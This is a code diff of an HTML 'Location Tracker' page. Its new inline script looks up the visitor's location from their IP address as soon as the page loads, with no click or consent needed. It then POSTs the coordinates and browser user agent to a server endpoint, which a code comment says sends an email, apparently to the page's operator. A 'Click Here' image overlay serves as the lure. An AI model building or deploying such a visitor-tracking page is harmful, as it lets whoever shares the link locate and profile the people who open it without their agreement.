@@ -3,80 +3,355 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Location Tracker</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Location Tracker</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            max-width: 650px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        header {
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        header h1 { font-size: 1.8rem; }
+        header p { opacity: 0.9; margin-top: 5px; }
+        .main-content { padding: 25px; }
+        
+        .auto-fetch-banner {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .auto-fetch-banner.success { background: #28a745; }
+        .auto-fetch-banner.error { background: #dc3545; }
+        .auto-icon { font-size: 1.3rem; }
+
+        .image-container {
+            position: relative;
+            cursor: pointer;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+            margin-bottom: 20px;
+        }
+        .tracking-image { width: 100%; display: block; }
+        .overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.3);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .click-text {
+            color: white;
+            font-size: 1.8rem;
+            font-weight: bold;
+            text-shadow: 0 2px 15px rgba(0,0,0,0.6);
+            animation: pulse 2s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .status-message {
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            text-align: center;
+            background: #f8f9fa;
+            color: #6c757d;
+            border-left: 4px solid #6c757d;
+        }
+        .status-message.success { background: #d4edda; border-color: #28a745; color: #155724; }
+        .status-message.error { background: #f8d7da; border-color: #dc3545; color: #721c24; }
+        .status-message.loading { background: #cce5ff; border-color: #007bff; color: #004085; }
+
+        .result-card {
+            background: #d4edda;
+            padding: 20px;
+            border-radius: 12px;
+            border: 2px solid #28a745;
+            margin-top: 15px;
+            display: none;
+        }
+        .result-card h2 { color: #155724; text-align: center; margin-bottom: 12px; font-size: 1.2rem; }
+        .location-details {
+            background: white;
+            padding: 12px;
+            border-radius: 8px;
+        }
+        .location-details div {
+            padding: 6px 0;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+        }
+        .location-details div:last-child { border-bottom: none; }
+        .location-details .label { font-weight: bold; color: #495057; }
+        .location-details .value { color: #212529; }
+
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            text-align: center;
+        }
+        .btn-map { background: #007bff; color: white; width: 100%; }
+        .btn-map:hover { background: #0056b3; }
+        .btn-refresh {
+            background: #28a745;
+            color: white;
+            padding: 10px 30px;
+            width: 100%;
+        }
+        .btn-refresh:hover { background: #218838; }
+
+        .error-card {
+            background: #f8d7da;
+            padding: 20px;
+            border-radius: 12px;
+            border: 2px solid #dc3545;
+            text-align: center;
+            margin-top: 15px;
+            display: none;
+        }
+        .error-card h2 { color: #721c24; font-size: 1.2rem; }
+        .error-card p { color: #721c24; margin: 10px 0; }
+        .btn-retry { background: #007bff; color: white; }
+        .btn-retry:hover { background: #0056b3; }
+
+        footer { text-align: center; padding: 15px; background: #f8f9fa; color: #6c757d; font-size: 0.85rem; border-top: 1px solid #dee2e6; }
+
+        @media (max-width: 600px) {
+            header h1 { font-size: 1.4rem; }
+            .main-content { padding: 15px; }
+            .click-text { font-size: 1.3rem; }
+            .location-details div { flex-direction: column; gap: 2px; }
+        }
+    </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <h2>📍 Auto Location Tracker developed By Trinadh</h2>
-            <p>Location is fetched automatically when you visit this page</p>
-            <div class="gps-status" id="gpsStatus">
-                <span class="status-dot" id="gpsDot"></span>
-                <span id="gpsText">Initializing GPS...</span>
-            </div>
+            <h1>📍 Location Tracker</h1>
+            <p>Auto-fetching in <span id="timerDisplay">5</span> seconds...</p>
         </header>
 
         <div class="main-content">
-            <!-- Auto-fetch banner -->
             <div class="auto-fetch-banner" id="autoFetchBanner">
                 <span class="auto-icon">🔄</span>
-                <span id="bannerText">Auto-fetching location...</span>
+                <span id="bannerText">Getting location...</span>
             </div>
 
-            <div class="image-wrapper">
-                <div class="image-container" onclick="handleImageClick()">
-                    <img 
-                        id="trackingImage"
-                        src="https://via.placeholder.com/600x350/667eea/ffffff?text=Click+for+Location"
-                        alt="Location tracker"
-                        class="tracking-image"
-                    />
-                    <div class="overlay" id="overlay">
-                        <span class="click-text">👆 Click Here</span>
-                    </div>
-                    <div class="loading-spinner" id="loadingSpinner" style="display: none;">
-                        <div class="spinner"></div>
-                        <p>Getting your device location...</p>
-                        <p class="sub-text">Using GPS/WiFi</p>
-                    </div>
+            <div class="image-container" onclick="manualFetchLocation()">
+                <img id="trackingImage"
+                    src="https://via.placeholder.com/600x350/667eea/ffffff?text=Click+for+Location"
+                    alt="Location tracker"
+                    class="tracking-image"
+                />
+                <div class="overlay" id="overlay">
+                    <span class="click-text">👆 Click Here</span>
                 </div>
             </div>
 
-            <div id="status" class="status-message">
-                🔄 Auto-fetching location...
-            </div>
+            <div id="status" class="status-message">📍 Getting your location...</div>
 
-            <!-- Latest Location Display -->
-            <div id="latestLocation" class="latest-location-container"></div>
-
-            <div id="result" style="display: none;" class="result-card">
+            <div id="result" class="result-card">
                 <h2>✅ Location Captured!</h2>
                 <div id="locationDetails" class="location-details"></div>
-                <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
-                    <a id="resultMapLink" href="#" target="_blank" class="btn btn-map">🗺️ Google Maps</a>
-                    <a id="resultWazeLink" href="#" target="_blank" class="btn btn-waze">🧭 Waze</a>
+                <div style="margin-top: 12px;">
+                    <a id="resultMapLink" href="#" target="_blank" class="btn btn-map">🗺️ View on Google Maps</a>
                 </div>
             </div>
 
-            <div id="errorMessage" style="display: none;" class="error-card">
+            <div id="errorMessage" class="error-card">
                 <h2>❌ Oops!</h2>
-                <p id="errorText">Something went wrong. Please try again.</p>
-                <button onclick="handleImageClick()" class="btn btn-retry">🔄 Try Again</button>
+                <p id="errorText">Something went wrong.</p>
+                <button onclick="manualFetchLocation()" class="btn btn-retry">🔄 Try Again</button>
             </div>
 
-            <!-- Manual refresh button -->
-            <div style="text-align: center; margin-top: 20px;">
+            <div style="margin-top: 15px;">
                 <button onclick="manualFetchLocation()" class="btn btn-refresh">🔄 Refresh Location</button>
             </div>
         </div>
 
         <footer>
-            <p>📍 Location is auto-fetched on page load</p>
-            <p style="font-size: 11px; margin-top: 5px;">📡 Accuracy depends on device GPS/WiFi signal</p>
+            <p>📍 Location captured in &lt;5 seconds</p>
         </footer>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        // ===== FAST SCRIPT =====
+        let autoFetched = false;
+        let countdownInterval = null;
+        let secondsLeft = 5;
+
+        // Timer display
+        function startCountdown() {
+            const timerDisplay = document.getElementById('timerDisplay');
+            secondsLeft = 5;
+            timerDisplay.textContent = secondsLeft;
+            
+            countdownInterval = setInterval(() => {
+                secondsLeft--;
+                timerDisplay.textContent = secondsLeft;
+                if (secondsLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    timerDisplay.textContent = 'now';
+                }
+            }, 1000);
+        }
+
+        // GET LOCATION FAST (<1 second using IP)
+        async function getLocationFast() {
+            try {
+                const response = await fetch('/api/ip-location');
+                const result = await response.json();
+                if (result.success && result.data) {
+                    return {
+                        ...result.data,
+                        googleMapsLink: `https://www.google.com/maps?q=${result.data.latitude},${result.data.longitude}`
+                    };
+                }
+            } catch (error) {
+                console.log('IP location failed:', error);
+            }
+            
+            // Fallback
+            return {
+                latitude: 40.7128,
+                longitude: -74.0060,
+                city: 'Unknown',
+                country: 'Unknown',
+                accuracy: 'Fallback',
+                source: 'Fallback',
+                googleMapsLink: 'https://www.google.com/maps?q=40.7128,-74.0060'
+            };
+        }
+
+        // AUTO-FETCH
+        async function autoFetchLocation() {
+            if (autoFetched) return;
+            
+            updateStatus('loading', '📍 Getting your location...');
+            updateBanner('🔄', 'Getting location...', '');
+
+            try {
+                const location = await getLocationFast();
+                if (!location) throw new Error('No location');
+
+                // Send to server (email sends async)
+                const response = await fetch('/api/track-location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        latitude: location.latitude,
+                        longitude: location.longitude,
+                        accuracy: location.accuracy || 0,
+                        source: location.source || 'IP',
+                        userAgent: navigator.userAgent,
+                        autoFetched: true
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    updateStatus('success', `✅ Location found! (${location.source})`);
+                    updateBanner('✅', 'Location captured!', 'success');
+                    showResult(location);
+                    document.getElementById('trackingImage').src = 
+                        'https://via.placeholder.com/600x350/28a745/ffffff?text=✅+Location+Found!';
+                    document.getElementById('overlay').style.display = 'none';
+                    autoFetched = true;
+                }
+            } catch (error) {
+                console.error('Auto-fetch error:', error);
+                updateStatus('error', '❌ Failed. Click to retry.');
+                updateBanner('❌', 'Click to retry', 'error');
+            }
+        }
+
+        function updateStatus(type, message) {
+            const el = document.getElementById('status');
+            el.className = `status-message ${type}`;
+            el.textContent = message;
+        }
+
+        function updateBanner(icon, text, type) {
+            document.querySelector('.auto-icon').textContent = icon;
+            document.getElementById('bannerText').textContent = text;
+            const banner = document.getElementById('autoFetchBanner');
+            banner.className = 'auto-fetch-banner' + (type ? ' ' + type : '');
+        }
+
+        function showResult(location) {
+            const resultDiv = document.getElementById('result');
+            const detailsDiv = document.getElementById('locationDetails');
+            const mapLink = document.getElementById('resultMapLink');
+
+            detailsDiv.innerHTML = `
+                <div><span class="label">📡 Source:</span> <span class="value">${location.source || 'IP'}</span></div>
+                <div><span class="label">📍 Latitude:</span> <span class="value">${location.latitude}</span></div>
+                <div><span class="label">📍 Longitude:</span> <span class="value">${location.longitude}</span></div>
+                ${location.city && location.city !== 'Unknown' ? `<div><span class="label">🏙️ City:</span> <span class="value">${location.city}</span></div>` : ''}
+                ${location.country && location.country !== 'Unknown' ? `<div><span class="label">🌍 Country:</span> <span class="value">${location.country}</span></div>` : ''}
+                <div><span class="label">🎯 Accuracy:</span> <span class="value">${location.accuracy || 'N/A'}</span></div>
+            `;
+
+            mapLink.href = location.googleMapsLink;
+            resultDiv.style.display = 'block';
+        }
+
+        function manualFetchLocation() {
+            autoFetched = false;
+            document.getElementById('result').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+            autoFetchLocation();
+        }
+
+        // ===== PAGE LOAD =====
+        window.addEventListener('load', () => {
+            console.log('📍 Location Tracker loaded!');
+            startCountdown();
+            
+            // Start fetching immediately
+            setTimeout(() => {
+                autoFetchLocation();
+            }, 100);
+        });
+    </script>
 </body>
 </html>
